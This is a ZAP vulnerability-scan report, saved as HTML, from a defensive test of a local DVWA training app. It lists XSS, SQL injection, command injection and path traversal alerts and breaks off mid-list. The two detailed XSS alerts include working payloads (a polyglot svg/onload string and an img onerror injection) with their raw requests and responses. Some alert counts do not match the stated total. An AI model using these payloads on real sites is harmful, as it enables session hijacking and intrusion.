@@ -1,0 +1,2769 @@
+<!DOCTYPE html>
+<!-- saved from url=(0067)file:///C:/Users/scott/OneDrive/Desktop/2024-04-01-ZAP-Report-.html -->
+<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>ZAP Scanning Report</title>
+<link href="./medium_ZAP Scanning Report_files/normalize.css" rel="stylesheet">
+<link href="./medium_ZAP Scanning Report_files/main.css" rel="stylesheet">
+<link href="./medium_ZAP Scanning Report_files/colors.css" rel="stylesheet">
+</head>
+<body>
+	<header>
+		<h1>ZAP Scanning Report</h1>
+		<p>
+			<span>Generated with</span> <a href="https://zaproxy.org/"><img src="./medium_ZAP Scanning Report_files/zap32x32.png" alt="The ZAP logo" class="zap-logo">ZAP</a>
+			<span>on Mon 1 Apr 2024, at 21:37:05</span>
+		</p>
+		<p>ZAP Version: 2.14.0</p>
+		<p>
+			ZAP is supported by the <a href="https://crashoverride.com/?zap=rep">Crash Override Open Source Fellowship</a>
+		</p>
+	</header>
+
+	<main>
+
+		<section id="contents" class="contents">
+			<h2>Contents</h2>
+			<nav>
+				<ol>
+					<li><a href="file:///C:/Users/scott/OneDrive/Desktop/2024-04-01-ZAP-Report-.html#about-this-report">About this report</a>
+						<ol>
+							
+							<li><a href="file:///C:/Users/scott/OneDrive/Desktop/2024-04-01-ZAP-Report-.html#report-parameters">Report parameters</a></li>
+						</ol></li>
+					<data-th-block>
+					<li><a href="file:///C:/Users/scott/OneDrive/Desktop/2024-04-01-ZAP-Report-.html#summaries">Summaries</a>
+						<ol>
+							<li><a href="file:///C:/Users/scott/OneDrive/Desktop/2024-04-01-ZAP-Report-.html#risk-confidence-counts">Alert counts by risk and confidence</a></li>
+							<li><a href="file:///C:/Users/scott/OneDrive/Desktop/2024-04-01-ZAP-Report-.html#site-risk-counts">Alert counts by site and risk</a></li>
+							<li><a href="file:///C:/Users/scott/OneDrive/Desktop/2024-04-01-ZAP-Report-.html#alert-type-counts">Alert counts by alert type</a></li>
+						</ol></li>
+					<li><a href="file:///C:/Users/scott/OneDrive/Desktop/2024-04-01-ZAP-Report-.html#alerts">Alerts</a>
+						<ol>
+							
+							
+							
+							
+							
+							<li><a href="file:///C:/Users/scott/OneDrive/Desktop/2024-04-01-ZAP-Report-.html#alerts--risk-3-confidence-3"><span>Risk</span>=<span class="risk-level">High</span>, <span>Confidence</span>=<span class="confidence-level">High</span> <span>(1)</span></a></li>
+							
+							<li><a href="file:///C:/Users/scott/OneDrive/Desktop/2024-04-01-ZAP-Report-.html#alerts--risk-3-confidence-2"><span>Risk</span>=<span class="risk-level">High</span>, <span>Confidence</span>=<span class="confidence-level">Medium</span> <span>(8)</span></a></li>
+							  
+							
+							
+							
+							
+							
+							
+							<li><a href="file:///C:/Users/scott/OneDrive/Desktop/2024-04-01-ZAP-Report-.html#alerts--risk-2-confidence-2"><span>Risk</span>=<span class="risk-level">Medium</span>, <span>Confidence</span>=<span class="confidence-level">Medium</span> <span>(3)</span></a></li>
+							  
+							 
+						</ol></li>
+					<li><a href="file:///C:/Users/scott/OneDrive/Desktop/2024-04-01-ZAP-Report-.html#appendix">Appendix</a>
+						<ol>
+							<li><a href="file:///C:/Users/scott/OneDrive/Desktop/2024-04-01-ZAP-Report-.html#alert-types">Alert types</a></li>
+						</ol></li>
+					</data-th-block>
+				</ol>
+			</nav>
+		</section>
+
+		<section id="about-this-report" class="about-this-report">
+			<h2>About this report</h2>
+
+			
+
+			<section id="report-parameters">
+				<h3>Report parameters</h3>
+				<div class="report-parameters--container">
+					<h4>Contexts</h4>
+					
+					
+					
+					
+					<p>The following contexts were selected to be included:</p>
+					<ul class="contexts-list">
+						<li><span class="context">Authentication Test</span></li>
+					</ul>
+					  
+
+					<h4>Sites</h4>
+					
+					<p>The following sites were included:</p>
+					<ul class="sites-list">
+						<li><span class="site">https://localhost</span></li>
+					</ul>
+					
+					<p>(If no sites were selected, all sites were included by default.)</p>
+					<p>An included site must also be within one of the included contexts for its data to be included in the report.</p>
+
+					<h4>Risk levels</h4>
+					<p>
+						<span>Included</span>:
+						 
+						<span class="included-risk-codes"><span class="risk-level">High</span>, <span class="risk-level">Medium</span>, <span class="risk-level">Low</span></span>
+					</p>
+					<p>
+						<span>Excluded</span>:
+						 
+						<span class="included-risk-codes"><span class="risk-level">High</span>, <span class="risk-level">Medium</span>, <span class="risk-level">Low</span>, <span class="risk-level">Informational</span></span>
+					</p>
+
+					<h4>Confidence levels</h4>
+					<p>
+						<span>Included</span>:
+						
+						
+						<span class="included-confidence-codes"><span class="confidence-level">User Confirmed</span>, <span class="confidence-level">High</span>, <span class="confidence-level">Medium</span></span>
+					</p>
+					<p>
+						<span>Excluded</span>:
+						
+						
+						<span class="included-confidence-codes"> <span class="confidence-level">User Confirmed</span>, <span class="confidence-level">High</span>, <span class="confidence-level">Medium</span>, <span class="confidence-level">Low</span>, <span class="confidence-level">False Positive</span></span>
+					</p>
+				</div>
+			</section>
+		</section>
+
+		
+		<section>
+			
+		</section>
+		
+		<section id="summaries" class="summaries">
+			<h2>Summaries</h2>
+
+			<section id="risk-confidence-counts">
+				<h3>Alert counts by risk and confidence</h3>
+				<table class="risk-confidence-counts-table">
+					<caption>
+						<p>This table shows the number of alerts for each level of risk and confidence included in the report.</p>
+						<p>(The percentages in brackets represent the count as a percentage of the total number of alerts included in the report, rounded to one decimal place.)</p>
+					</caption>
+					<colgroup>
+						<col>
+						<col>
+					</colgroup>
+					<colgroup>
+						<col style="width: 17.5%"><col style="width: 17.5%"><col style="width: 17.5%">
+						<col style="width: 17.5%">
+					</colgroup>
+					<thead>
+						<tr>
+							<td colspan="2" rowspan="2"></td>
+							<th scope="colgroup" colspan="4">Confidence</th>
+						</tr>
+						<tr>
+							<th scope="col">User Confirmed</th>
+							<th scope="col">High</th>
+							<th scope="col">Medium</th>
+							<th scope="col">Total</th>
+						</tr>
+					</thead>
+					<tbody>
+						<tr>
+							<th scope="rowgroup" rowspan="4">Risk</th>
+							<th scope="row">High</th>
+							<td><span>0</span><br> <span class="additional-info-percentages">(0.0%)</span></td>
+							<td><span>1</span><br> <span class="additional-info-percentages">(8.3%)</span></td>
+							<td><span>8</span><br> <span class="additional-info-percentages">(66.7%)</span></td>
+							<td><span>9</span><br> <span class="additional-info-percentages">(75.0%)</span></td>
+						</tr>
+						<tr>
+							
+							<th scope="row">Medium</th>
+							<td><span>0</span><br> <span class="additional-info-percentages">(0.0%)</span></td>
+							<td><span>0</span><br> <span class="additional-info-percentages">(0.0%)</span></td>
+							<td><span>3</span><br> <span class="additional-info-percentages">(25.0%)</span></td>
+							<td><span>3</span><br> <span class="additional-info-percentages">(25.0%)</span></td>
+						</tr>
+						<tr>
+							
+							<th scope="row">Low</th>
+							<td><span>0</span><br> <span class="additional-info-percentages">(0.0%)</span></td>
+							<td><span>0</span><br> <span class="additional-info-percentages">(0.0%)</span></td>
+							<td><span>0</span><br> <span class="additional-info-percentages">(0.0%)</span></td>
+							<td><span>0</span><br> <span class="additional-info-percentages">(0.0%)</span></td>
+						</tr>
+						<tr>
+							<th scope="row">Total</th>
+							<td><span>0</span><br> <span class="additional-info-percentages">(0.0%)</span></td>
+							<td><span>1</span><br> <span class="additional-info-percentages">(8.3%)</span></td>
+							<td><span>11</span><br> <span class="additional-info-percentages">(91.7%)</span></td>
+							<td><span>12</span><br> <span class="additional-info-percentages">(100%)</span></td>
+						</tr>
+					</tbody>
+				</table>
+			</section>
+
+			<section id="site-risk-counts">
+				<h3>Alert counts by site and risk</h3>
+				<table class="site-risk-counts-table">
+					<caption>
+						<p>This table shows, for each site for which one or more alerts were raised, the number of alerts raised at each risk level.</p>
+						<p>Alerts with a confidence level of "False Positive" have been excluded from these counts.</p>
+						<p>(The numbers in brackets are the number of alerts raised for the site at or above that risk level.)</p>
+					</caption>
+					<colgroup>
+						<col>
+						<col>
+					</colgroup>
+					<colgroup>
+						<col style="width: 21.666666666666668%"><col style="width: 21.666666666666668%"><col style="width: 21.666666666666668%">
+					</colgroup>
+					<thead>
+						<tr>
+							<td colspan="2" rowspan="2"></td>
+							<th scope="colgroup" colspan="3">Risk</th>
+						</tr>
+						<tr>
+							<th scope="col">
+								<span>High</span><br>  <span class="additional-info-percentages">(= High)</span>  
+							</th>
+							<th scope="col">
+								<span>Medium</span><br>   <span class="additional-info-percentages">(&gt;= Medium)</span> 
+							</th>
+							<th scope="col">
+								<span>Low</span><br>   <span class="additional-info-percentages">(&gt;= Low)</span> 
+							</th>
+						</tr>
+					</thead>
+					<tbody>
+						<tr>
+							<th scope="rowgroup" rowspan="1">Site</th>
+							<th scope="row">https://localhost</th>
+							
+							<td><span>9</span><br> <span class="additional-info-percentages">(9)</span></td>
+							<td><span>3</span><br> <span class="additional-info-percentages">(12)</span></td>
+							<td><span>0</span><br> <span class="additional-info-percentages">(12)</span></td>
+							
+						</tr>
+					</tbody>
+				</table>
+			</section>
+
+			<section id="alert-type-counts">
+				<h3>Alert counts by alert type</h3>
+				<table class="alert-type-counts-table">
+					<caption>
+						<p>This table shows the number of alerts of each alert type, together with the alert type's risk level.</p>
+						<p>(The percentages in brackets represent each count as a percentage, rounded to one decimal place, of the total number of alerts included in this report.)</p>
+					</caption>
+					<thead>
+						<tr>
+							<th scope="col">Alert type</th>
+							<th scope="col">Risk</th>
+							<th scope="col">Count</th>
+						</tr>
+					</thead>
+					<tbody>
+						<tr>
+							<th scope="row"><a href="file:///C:/Users/scott/OneDrive/Desktop/2024-04-01-ZAP-Report-.html#alert-type-0">Cross Site Scripting (DOM Based)</a></th>
+							<td class="risk-level">High</td>
+							<td><span>2</span><br> <span class="additional-info-percentages">(16.7%)</span></td>
+						</tr>
+						<tr>
+							<th scope="row"><a href="file:///C:/Users/scott/OneDrive/Desktop/2024-04-01-ZAP-Report-.html#alert-type-1">Cross Site Scripting (Reflected)</a></th>
+							<td class="risk-level">High</td>
+							<td><span>8</span><br> <span class="additional-info-percentages">(66.7%)</span></td>
+						</tr>
+						<tr>
+							<th scope="row"><a href="file:///C:/Users/scott/OneDrive/Desktop/2024-04-01-ZAP-Report-.html#alert-type-2">External Redirect</a></th>
+							<td class="risk-level">High</td>
+							<td><span>1</span><br> <span class="additional-info-percentages">(8.3%)</span></td>
+						</tr>
+						<tr>
+							<th scope="row"><a href="file:///C:/Users/scott/OneDrive/Desktop/2024-04-01-ZAP-Report-.html#alert-type-3">Path Traversal</a></th>
+							<td class="risk-level">High</td>
+							<td><span>1</span><br> <span class="additional-info-percentages">(8.3%)</span></td>
+						</tr>
+						<tr>
+							<th scope="row"><a href="file:///C:/Users/scott/OneDrive/Desktop/2024-04-01-ZAP-Report-.html#alert-type-4">Remote OS Command Injection</a></th>
+							<td class="risk-level">High</td>
+							<td><span>1</span><br> <span class="additional-info-percentages">(8.3%)</span></td>
+						</tr>
+						<tr>
+							<th scope="row"><a href="file:///C:/Users/scott/OneDrive/Desktop/2024-04-01-ZAP-Report-.html#alert-type-5">SQL Injection</a></th>
+							<td class="risk-level">High</td>
+							<td><span>8</span><br> <span class="additional-info-percentages">(66.7%)</span></td>
+						</tr>
+						<tr>
+							<th scope="row"><a href="file:///C:/Users/scott/OneDrive/Desktop/2024-04-01-ZAP-Report-.html#alert-type-6">SQL Injection - MySQL</a></th>
+							<td class="risk-level">High</td>
+							<td><span>3</span><br> <span class="additional-info-percentages">(25.0%)</span></td>
+						</tr>
+						<tr>
+							<th scope="row"><a href="file:///C:/Users/scott/OneDrive/Desktop/2024-04-01-ZAP-Report-.html#alert-type-7">SQL Injection - Oracle - Time Based</a></th>
+							<td class="risk-level">High</td>
+							<td><span>34</span><br> <span class="additional-info-percentages">(283.3%)</span></td>
+						</tr>
+						<tr>
+							<th scope="row"><a href="file:///C:/Users/scott/OneDrive/Desktop/2024-04-01-ZAP-Report-.html#alert-type-8">SQL Injection - SQLite</a></th>
+							<td class="risk-level">High</td>
+							<td><span>111</span><br> <span class="additional-info-percentages">(925.0%)</span></td>
+						</tr>
+						<tr>
+							<th scope="row"><a href="file:///C:/Users/scott/OneDrive/Desktop/2024-04-01-ZAP-Report-.html#alert-type-9">Buffer Overflow</a></th>
+							<td class="risk-level">Medium</td>
+							<td><span>1</span><br> <span class="additional-info-percentages">(8.3%)</span></td>
+						</tr>
+						<tr>
+							<th scope="row"><a href="file:///C:/Users/scott/OneDrive/Desktop/2024-04-01-ZAP-Report-.html#alert-type-10">Directory Browsing</a></th>
+							<td class="risk-level">Medium</td>
+							<td><span>2</span><br> <span class="additional-info-percentages">(16.7%)</span></td>
+						</tr>
+						<tr>
+							<th scope="row"><a href="file:///C:/Users/scott/OneDrive/Desktop/2024-04-01-ZAP-Report-.html#alert-type-11">XSLT Injection</a></th>
+							<td class="risk-level">Medium</td>
+							<td><span>1</span><br> <span class="additional-info-percentages">(8.3%)</span></td>
+						</tr>
+					</tbody>
+					<tfoot>
+						<tr>
+							<th scope="row">Total</th>
+							<td></td>
+							<td>12</td>
+						</tr>
+					</tfoot>
+				</table>
+			</section>
+		</section>
+
+		<section id="alerts" class="alerts">
+			<h2>Alerts</h2>
+			<ol>
+				
+				 
+				
+				
+				<li id="alerts--risk-3-confidence-3">
+					<h3>
+						<span>Risk</span>=<span class="risk-level">High</span>, <span>Confidence</span>=<span class="confidence-level">High</span> <span>(1)</span>
+					</h3>
+					<ol>
+						
+						<li class="alerts--site-li">
+							<h4>
+								<span class="site">https://localhost</span> <span>(1)</span>
+							</h4>
+							<ol>
+								
+								<li>
+									<h5>
+										<a href="file:///C:/Users/scott/OneDrive/Desktop/2024-04-01-ZAP-Report-.html#alert-type-0">Cross Site Scripting (DOM Based)</a> <span>(1)</span>
+									</h5>
+									<ol>
+										<li><details>
+												<summary>
+													<span class="request-method-n-url">GET https://localhost/DVWA/vulnerabilities/xss_r/#jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert(5397) )//%0D%0A%0d%0a//&lt;/stYle/&lt;/titLe/&lt;/teXtarEa/&lt;/scRipt/--!&gt;\x3csVg/&lt;sVg/oNloAd=alert(5397)//&gt;\x3e</span>
+												</summary>
+												
+<table class="alerts-table">
+	<tbody><tr>
+		<th scope="row">Alert tags</th>
+		<td>
+			<ul class="alert-tags-list">
+				<li>
+					<span><a href="https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/11-Client-side_Testing/01-Testing_for_DOM-based_Cross_Site_Scripting">WSTG-v42-CLNT-01</a></span> 
+				</li>
+				<li>
+					<span><a href="https://owasp.org/Top10/A03_2021-Injection/">OWASP_2021_A03</a></span> 
+				</li>
+				<li>
+					<span><a href="https://owasp.org/www-project-top-ten/2017/A7_2017-Cross-Site_Scripting_(XSS).html">OWASP_2017_A07</a></span> 
+				</li>
+			</ul>
+		</td>
+	</tr>
+	<tr>
+		<th scope="row">Alert description</th>
+		<td> 
+<p>Cross-site Scripting (XSS) is an attack technique that involves echoing attacker-supplied code into a user's browser instance. A browser instance can be a standard web browser client, or a browser object embedded in a software product such as the browser within WinAmp, an RSS reader, or an email client. The code itself is usually written in HTML/JavaScript, but may also extend to VBScript, ActiveX, Java, Flash, or any other browser-supported technology.</p>
+
+<p>When an attacker gets a user's browser to execute his/her code, the code will run within the security context (or zone) of the hosting web site. With this level of privilege, the code has the ability to read, modify and transmit any sensitive data accessible by the browser. A Cross-site Scripted user could have his/her account hijacked (cookie theft), their browser redirected to another location, or possibly shown fraudulent content delivered by the web site they are visiting. Cross-site Scripting attacks essentially compromise the trust relationship between a user and the web site. Applications utilizing browser object instances which load content from the file system may execute code under the local machine zone allowing for system compromise.</p>
+
+<p>There are three types of Cross-site Scripting attacks: non-persistent, persistent and DOM-based.</p>
+
+<p>Non-persistent attacks and DOM-based attacks require a user to either visit a specially crafted link laced with malicious code, or visit a malicious web page containing a web form, which when posted to the vulnerable site, will mount the attack. Using a malicious form will oftentimes take place when the vulnerable resource only accepts HTTP POST requests. In such a case, the form can be submitted automatically, without the victim's knowledge (e.g. by using JavaScript). Upon clicking on the malicious link or submitting the malicious form, the XSS payload will get echoed back and will get interpreted by the user's browser and execute. Another technique to send almost arbitrary requests (GET and POST) is by using an embedded client, such as Adobe Flash.</p>
+
+<p>Persistent attacks occur when the malicious code is submitted to a web site where it's stored for a period of time. Examples of an attacker's favorite targets often include message board posts, web mail messages, and web chat software. The unsuspecting user is not required to interact with any additional site/link (e.g. an attacker site or a malicious link sent via email), just simply view the web page containing the code.</p>
+ </td>
+	</tr>
+	<tr>
+		<th scope="row">Other info</th>
+		<td> 
+<p>Tag name: div Att name: null Att id: container</p>
+ </td>
+	</tr>
+	<tr>
+		<th scope="row">Request</th>
+		<td><details open="open">
+				<summary>Request line and header section (550 bytes)</summary>
+				
+				<pre><code>GET https://localhost/DVWA/vulnerabilities/xss_r/ HTTP/1.1
+host: localhost
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Referer: https://localhost/DVWA/
+Connection: keep-alive
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Cookie: security=low; PHPSESSID=alnsu3bebb23m003t20jm8vsnn
+
+</code></pre>
+				
+				
+			</details> <details class="request-body" open="open">
+				<summary>Request body (0 bytes)</summary>
+				
+				<pre><code></code></pre>
+				
+				
+			</details></td>
+	</tr>
+	<tr>
+		<th scope="row">Response</th>
+		<td><details open="open">
+				<summary>Status line and header section (14 bytes)</summary>
+				
+				<pre><code>HTTP/1.0 0
+
+</code></pre>
+				
+				
+			</details> <details class="response-body" open="open">
+				<summary>Response body (0 bytes)</summary>
+				
+				<pre><code></code></pre>
+				
+				
+			</details></td>
+	</tr>
+	
+	<tr>
+		<th scope="row">Attack</th>
+		<td><pre><code>#jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert(5397) )//%0D%0A%0d%0a//&lt;/stYle/&lt;/titLe/&lt;/teXtarEa/&lt;/scRipt/--!&gt;\x3csVg/&lt;sVg/oNloAd=alert(5397)//&gt;\x3e</code></pre></td>
+	</tr>
+	
+	<tr>
+		<th scope="row">Solution</th>
+		<td> 
+<p>Phase: Architecture and Design</p>
+
+<p>Use a vetted library or framework that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid.</p>
+
+<p>Examples of libraries and frameworks that make it easier to generate properly encoded output include Microsoft's Anti-XSS library, the OWASP ESAPI Encoding module, and Apache Wicket.</p>
+
+<p>Phases: Implementation; Architecture and Design</p>
+
+<p>Understand the context in which your data will be used and the encoding that will be expected. This is especially important when transmitting data between different components, or when generating outputs that can contain multiple encodings at the same time, such as web pages or multi-part mail messages. Study all expected communication protocols and data representations to determine the required encoding strategies.</p>
+
+<p>For any data that will be output to another web page, especially any data that was received from external inputs, use the appropriate encoding on all non-alphanumeric characters.</p>
+
+<p>Consult the XSS Prevention Cheat Sheet for more details on the types of encoding and escaping that are needed.</p>
+
+<p>Phase: Architecture and Design</p>
+
+<p>For any security checks that are performed on the client side, ensure that these checks are duplicated on the server side, in order to avoid CWE-602. Attackers can bypass the client-side checks by modifying values after the checks have been performed, or by changing the client to remove the client-side checks entirely. Then, these modified values would be submitted to the server.</p>
+
+<p>If available, use structured mechanisms that automatically enforce the separation between data and code. These mechanisms may be able to provide the relevant quoting, encoding, and validation automatically, instead of relying on the developer to provide this capability at every point where output is generated.</p>
+
+<p>Phase: Implementation</p>
+
+<p>For every web page that is generated, use and specify a character encoding such as ISO-8859-1 or UTF-8. When an encoding is not specified, the web browser may choose a different encoding by guessing which encoding is actually being used by the web page. This can cause the web browser to treat certain sequences as special, opening up the client to subtle XSS attacks. See CWE-116 for more mitigations related to encoding/escaping.</p>
+
+<p>To help mitigate XSS attacks against the user's session cookie, set the session cookie to be HttpOnly. In browsers that support the HttpOnly feature (such as more recent versions of Internet Explorer and Firefox), this attribute can prevent the user's session cookie from being accessible to malicious client-side scripts that use document.cookie. This is not a complete solution, since HttpOnly is not supported by all browsers. More importantly, XMLHTTPRequest and other powerful browser technologies provide read access to HTTP headers, including the Set-Cookie header in which the HttpOnly flag is set.</p>
+
+<p>Assume all input is malicious. Use an "accept known good" input validation strategy, i.e., use an allow list of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does. Do not rely exclusively on looking for malicious or malformed inputs (i.e., do not rely on a deny list). However, deny lists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.</p>
+
+<p>When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, "boat" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if you are expecting colors such as "red" or "blue."</p>
+
+<p>Ensure that you perform input validation at well-defined interfaces within the application. This will help protect the application even if a component is reused or moved elsewhere.</p>
+
+<p>	</p>
+ </td>
+	</tr>
+</tbody></table>
+
+											</details></li>
+									</ol>
+								</li>
+								
+							</ol>
+						</li>
+						
+					</ol>
+				</li>
+				
+				<li id="alerts--risk-3-confidence-2">
+					<h3>
+						<span>Risk</span>=<span class="risk-level">High</span>, <span>Confidence</span>=<span class="confidence-level">Medium</span> <span>(8)</span>
+					</h3>
+					<ol>
+						
+						<li class="alerts--site-li">
+							<h4>
+								<span class="site">https://localhost</span> <span>(8)</span>
+							</h4>
+							<ol>
+								
+								<li>
+									<h5>
+										<a href="file:///C:/Users/scott/OneDrive/Desktop/2024-04-01-ZAP-Report-.html#alert-type-1">Cross Site Scripting (Reflected)</a> <span>(1)</span>
+									</h5>
+									<ol>
+										<li><details>
+												<summary>
+													<span class="request-method-n-url">POST https://localhost/DVWA/vulnerabilities/authbypass/change_user_details.php</span>
+												</summary>
+												
+<table class="alerts-table">
+	<tbody><tr>
+		<th scope="row">Alert tags</th>
+		<td>
+			<ul class="alert-tags-list">
+				<li>
+					<span><a href="https://owasp.org/Top10/A03_2021-Injection/">OWASP_2021_A03</a></span> 
+				</li>
+				<li>
+					<span><a href="https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/01-Testing_for_Reflected_Cross_Site_Scripting">WSTG-v42-INPV-01</a></span> 
+				</li>
+				<li>
+					<span><a href="https://owasp.org/www-project-top-ten/2017/A7_2017-Cross-Site_Scripting_(XSS).html">OWASP_2017_A07</a></span> 
+				</li>
+			</ul>
+		</td>
+	</tr>
+	<tr>
+		<th scope="row">Alert description</th>
+		<td> 
+<p>Cross-site Scripting (XSS) is an attack technique that involves echoing attacker-supplied code into a user's browser instance. A browser instance can be a standard web browser client, or a browser object embedded in a software product such as the browser within WinAmp, an RSS reader, or an email client. The code itself is usually written in HTML/JavaScript, but may also extend to VBScript, ActiveX, Java, Flash, or any other browser-supported technology.</p>
+
+<p>When an attacker gets a user's browser to execute his/her code, the code will run within the security context (or zone) of the hosting web site. With this level of privilege, the code has the ability to read, modify and transmit any sensitive data accessible by the browser. A Cross-site Scripted user could have his/her account hijacked (cookie theft), their browser redirected to another location, or possibly shown fraudulent content delivered by the web site they are visiting. Cross-site Scripting attacks essentially compromise the trust relationship between a user and the web site. Applications utilizing browser object instances which load content from the file system may execute code under the local machine zone allowing for system compromise.</p>
+
+<p>There are three types of Cross-site Scripting attacks: non-persistent, persistent and DOM-based.</p>
+
+<p>Non-persistent attacks and DOM-based attacks require a user to either visit a specially crafted link laced with malicious code, or visit a malicious web page containing a web form, which when posted to the vulnerable site, will mount the attack. Using a malicious form will oftentimes take place when the vulnerable resource only accepts HTTP POST requests. In such a case, the form can be submitted automatically, without the victim's knowledge (e.g. by using JavaScript). Upon clicking on the malicious link or submitting the malicious form, the XSS payload will get echoed back and will get interpreted by the user's browser and execute. Another technique to send almost arbitrary requests (GET and POST) is by using an embedded client, such as Adobe Flash.</p>
+
+<p>Persistent attacks occur when the malicious code is submitted to a web site where it's stored for a period of time. Examples of an attacker's favorite targets often include message board posts, web mail messages, and web chat software. The unsuspecting user is not required to interact with any additional site/link (e.g. an attacker site or a malicious link sent via email), just simply view the web page containing the code.</p>
+ </td>
+	</tr>
+	
+	<tr>
+		<th scope="row">Request</th>
+		<td><details open="open">
+				<summary>Request line and header section (562 bytes)</summary>
+				
+				<pre><code>POST https://localhost/DVWA/vulnerabilities/authbypass/change_user_details.php HTTP/1.1
+host: localhost
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0
+Accept: application/json
+Accept-Language: en-US,en;q=0.5
+Referer: https://localhost/DVWA/vulnerabilities/authbypass/
+Content-Type: application/json
+content-length: 93
+Origin: https://localhost
+Connection: keep-alive
+Sec-Fetch-Dest: empty
+Sec-Fetch-Mode: cors
+Sec-Fetch-Site: same-origin
+Cookie: security=medium; PHPSESSID=cd19ph407vbq0llvn192u9o5g3
+
+</code></pre>
+				
+				
+			</details> <details class="request-body" open="open">
+				<summary>Request body (93 bytes)</summary>
+				
+				<pre><code>{"id":"&lt;img src=x onerror=prompt()&gt;","first_name":"GordonxqxJLdYu","surname":"BrownnOjbTKDF"}</code></pre>
+				
+				
+			</details></td>
+	</tr>
+	<tr>
+		<th scope="row">Response</th>
+		<td><details open="open">
+				<summary>Status line and header section (364 bytes)</summary>
+				
+				<pre><code>HTTP/1.1 200 OK
+Date: Mon, 01 Apr 2024 05:54:27 GMT
+Server: Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.0.30
+X-Powered-By: PHP/8.0.30
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate
+Pragma: no-cache
+Content-Length: 187
+Keep-Alive: timeout=5, max=99
+Connection: Keep-Alive
+Content-Type: text/html; charset=UTF-8
+
+</code></pre>
+				
+				
+			</details> <details class="response-body" open="open">
+				<summary>Response body (187 bytes)</summary>
+				
+				<pre><code>&lt;pre&gt;You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '&lt;img src=x onerror=prompt()&gt;' at line 1&lt;/pre&gt;</code></pre>
+				
+				
+			</details></td>
+	</tr>
+	<tr>
+		<th scope="row">Parameter</th>
+		<td><pre><code>id</code></pre></td>
+	</tr>
+	<tr>
+		<th scope="row">Attack</th>
+		<td><pre><code>&lt;img src=x onerror=prompt()&gt;</code></pre></td>
+	</tr>
+	<tr>
+		<th scope="row">Evidence</th>
+		<td><pre><code>&lt;img src=x onerror=prompt()&gt;</code></pre></td>
+	</tr>
+	<tr>
+		<th scope="row">Solution</th>
+		<td> 
+<p>Phase: Architecture and Design</p>
+
+<p>Use a vetted library or framework that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid.</p>
+
+<p>Examples of libraries and frameworks that make it easier to generate properly encoded output include Microsoft's Anti-XSS library, the OWASP ESAPI Encoding module, and Apache Wicket.</p>
+
+<p>Phases: Implementation; Architecture and Design</p>
+
+<p>Understand the context in which your data will be used and the encoding that will be expected. This is especially important when transmitting data between different components, or when generating outputs that can contain multiple encodings at the same time, such as web pages or multi-part mail messages. Study all expected communication protocols and data representations to determine the required encoding strategies.</p>
+
+<p>For any data that will be output to another web page, especially any data that was received from external inputs, use the appropriate encoding on all non-alphanumeric characters.</p>
+
+<p>Consult the XSS Prevention Cheat Sheet for more details on the types of encoding and escaping that are needed.</p>
+
+<p>Phase: Architecture and Design</p>
+
+<p>For any security checks that are performed on the client side, ensure that these checks are duplicated on the server side, in order to avoid CWE-602. Attackers can bypass the client-side checks by modifying values after the checks have been performed, or by changing the client to remove the client-side checks entirely. Then, these modified values would be submitted to the server.</p>
+
+<p>If available, use structured mechanisms that automatically enforce the separation between data and code. These mechanisms may be able to provide the relevant quoting, encoding, and validation automatically, instead of relying on the developer to provide this capability at every point where output is generated.</p>
+
+<p>Phase: Implementation</p>
+
+<p>For every web page that is generated, use and specify a character encoding such as ISO-8859-1 or UTF-8. When an encoding is not specified, the web browser may choose a different encoding by guessing which encoding is actually being used by the web page. This can cause the web browser to treat certain sequences as special, opening up the client to subtle XSS attacks. See CWE-116 for more mitigations related to encoding/escaping.</p>
+
+<p>To help mitigate XSS attacks against the user's session cookie, set the session cookie to be HttpOnly. In browsers that support the HttpOnly feature (such as more recent versions of Internet Explorer and Firefox), this attribute can prevent the user's session cookie from being accessible to malicious client-side scripts that use document.cookie. This is not a complete solution, since HttpOnly is not supported by all browsers. More importantly, XMLHTTPRequest and other powerful browser technologies provide read access to HTTP headers, including the Set-Cookie header in which the HttpOnly flag is set.</p>
+
+<p>Assume all input is malicious. Use an "accept known good" input validation strategy, i.e., use an allow list of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does. Do not rely exclusively on looking for malicious or malformed inputs (i.e., do not rely on a deny list). However, deny lists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.</p>
+
+<p>When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, "boat" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if you are expecting colors such as "red" or "blue."</p>
+
+<p>Ensure that you perform input validation at well-defined interfaces within the application. This will help protect the application even if a component is reused or moved elsewhere.</p>
+
+<p>	</p>
+ </td>
+	</tr>
+</tbody></table>
+
+											</details></li>
+									</ol>
+								</li>
+								
+								<li>
+									<h5>
